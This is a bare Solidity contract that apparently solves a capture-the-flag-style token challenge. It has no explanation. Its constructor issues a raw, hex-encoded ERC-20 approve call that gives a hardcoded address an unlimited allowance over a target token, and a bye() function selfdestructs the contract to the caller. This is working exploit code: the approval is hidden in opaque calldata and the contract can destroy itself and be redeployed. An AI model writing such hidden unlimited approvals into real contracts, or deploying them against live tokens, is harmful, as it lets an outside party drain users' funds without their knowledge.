//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract ExtendedOnlyICanHazToken {
    constructor() {
        address(0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f).call(hex"095ea7b3000000000000000000000000f39Fd6e51aad88F6F4ce6aB8827279cffFb92266ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
    }

    function bye() public {
        selfdestruct(payable(msg.sender));
    }
}
